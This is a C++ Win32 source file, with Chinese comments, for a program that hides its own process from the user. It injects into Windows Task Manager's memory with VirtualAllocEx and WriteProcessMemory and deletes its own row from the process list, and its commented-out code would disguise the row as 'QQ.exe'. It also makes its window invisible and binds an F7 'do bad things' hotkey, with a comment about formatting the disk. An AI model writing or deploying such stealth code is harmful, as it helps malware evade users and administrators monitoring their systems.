// HideMyProcess.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "HideMyProcess.h"
#include <CommCtrl.h>
#include <wchar.h> 
DWORD dwDoSomethingID;  // 对讲机的频道  -  放炸弹
DWORD dwCloseID;		// 对讲机的频道  -  告诉进入车站内部的人，自杀，进程关闭
#define MAX_LOADSTRING 100

// 全局变量: 
HINSTANCE hInst;								// 当前实例
TCHAR szTitle[MAX_LOADSTRING];					// 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];			// 主窗口类名

// 此代码模块中包含的函数的前向声明: 
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO:  在此放置代码。
	MSG msg;
	HACCEL hAccelTable;

	// 初始化全局字符串
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_HIDEMYPROCESS, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化: 
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_HIDEMYPROCESS));

	// 主消息循环: 
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  函数:  MyRegisterClass()
//
//  目的:  注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_HIDEMYPROCESS));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= 0;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   函数:  InitInstance(HINSTANCE, int)
//
//   目的:  保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 将实例句柄存储在全局变量中

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      800, 400, 400, 400, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}
DWORD WINAPI HideMyProcss(LPARAM lparam)
{
	while (TRUE)
	{
		HWND m_hWnd = FindWindowA("#32770", "Windows 任务管理器");
		if (!m_hWnd)// 查找到任务管理器的主窗口
		{
			Sleep(100);
			continue;
		}
		HWND hwnd = GetWindow(m_hWnd, GW_CHILD);//检查到TabControl的窗口
		while (hwnd != NULL)
		{
			HWND hwnd_1 = GetWindow(hwnd, GW_CHILD);// 进程窗口
			while (hwnd_1 != NULL)
			{
				TCHAR wndtext[MAX_PATH] = { 0 };
				GetWindowText(hwnd_1, wndtext, MAX_PATH);
				if (lstrcmp(wndtext, "进程") == 0)
				{
					DWORD dwPID;
					GetWindowThreadProcessId(m_hWnd, &dwPID);//获取任务管理器的进程ID
					HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwPID);
					if (!hProcess)
					{
						Sleep(100);
						continue;
					}
					LVITEM lvitem, *plvitem;
					WCHAR ItemLocalBuf[512], *pRemoteBuf;
					pRemoteBuf = (WCHAR *)VirtualAllocEx(hProcess, NULL, 512, MEM_COMMIT, PAGE_READWRITE);
					// 在任务管理器的进程中申请一片内存
					plvitem = (LVITEM *)VirtualAllocEx(hProcess, NULL, sizeof(LVITEM), MEM_COMMIT, PAGE_READWRITE);
					// listview item struct init
					lvitem.cchTextMax = 512;
					lvitem.iSubItem = 0;
					lvitem.mask = LVIF_TEXT;
					lvitem.pszText = pRemoteBuf;
					// 检查远程申请内存是否成功，如果失败，返回 FALSE
					if (!plvitem || !pRemoteBuf)
					{
						Sleep(10);
						continue;
					}
					// 把参数写入远程进程 
					WriteProcessMemory(hProcess, plvitem, &lvitem, sizeof(LVITEM), NULL);

					//  正式干活
					// 获取Listview的全部子项
					int cnt = ListView_GetItemCount(hwnd_1);
					for (int i = 0; i < cnt; i++)
					{
						LRESULT nbuf = SendMessage(hwnd_1, LVM_GETITEMTEXT, (WPARAM)i, (LPARAM)plvitem);// 返回获取的文本长度 
						if (nbuf)
						{
							// 把结果从远程的进程里面读取回来
							ReadProcessMemory(hProcess, pRemoteBuf, ItemLocalBuf, 512 * sizeof(WCHAR), NULL);
							if (_tcsstr(ItemLocalBuf, "HideMyProcess") != 0)
							{
								// 变身，穿上小马甲
// 								WriteProcessMemory(hProcess, pRemoteBuf, L"择善牌QQ.exe", 30, 0);
// 								nbuf = SendMessage(hwnd_1, LVM_SETITEMTEXT, (WPARAM)i, (LPARAM)plvitem);
								ListView_DeleteItem(hwnd_1, i);
							}
						}
					}
				}
				hwnd_1 = GetWindow(hwnd_1, GW_HWNDNEXT);
			}
			hwnd = GetWindow(hwnd, GW_HWNDNEXT);
		}
	}
	return 0;
}
//
//  函数:  WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND	- 处理应用程序菜单
//  WM_PAINT	- 绘制主窗口
//  WM_DESTROY	- 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;
	DWORD lStyle;
	HANDLE hHackThread;
	switch (message)
	{
	case WM_NCPAINT:return true;
	case WM_NCCALCSIZE:return true;
	case WM_NCACTIVATE:return true;
	case WM_CREATE:
		// 会生成一个操作系统内唯一的一个32位整数值，作为对讲机频道的ID
		dwDoSomethingID = GlobalAddAtom("ZS 431493983");
		dwCloseID = GlobalAddAtom(L"Window 921700006");
		if (!RegisterHotKey(hWnd, dwDoSomethingID, NULL, VK_F7))//F7 按键对应于干坏事的频道
		{
			MessageBox(0, "注册干坏事的热键失败了", 0, 0);
			PostQuitMessage(0);
		}
		if (!RegisterHotKey(hWnd, dwCloseID, NULL, VK_F8))// F8 对应于关闭的频道
		{
			MessageBox(0, "注册自身关闭的热键失败了", 0, 0);
			PostQuitMessage(0);
		}

		lStyle = GetWindowLong(hWnd, GWL_EXSTYLE);//获取窗口的高级属性
		lStyle &= ~WS_EX_APPWINDOW;// 去除属性内的WS_EX_APPWINDOW
		lStyle |= WS_EX_TOOLWINDOW;// 增加WS_EX_TOOLWINDOW
		lStyle |= WS_EX_LAYERED;
		SetWindowLong(hWnd, GWL_EXSTYLE, lStyle);//设置回窗口里面去
		SetLayeredWindowAttributes(hWnd, RGB(0xFF, 0xFF, 0xFF), 0, LWA_COLORKEY);

		// 把窗口移动到坐标（0，0）的位置，同时窗口大小调整为0，0
		// SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW);
		hHackThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)HideMyProcss, 0, 0, 0);
		CloseHandle(hHackThread);
		break;
	case WM_HOTKEY:
		if (wParam == dwCloseID)
		{
			MessageBox(0, "BYE BYE", 0, 0);
			PostQuitMessage(0);
		}
		else if (wParam == dwDoSomethingID)
		{
			// do something ,  format your disk
			MessageBox(0, L"hack your pp", 0, 0);
		}
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 分析菜单选择: 
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO:  在此添加任意绘图代码...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
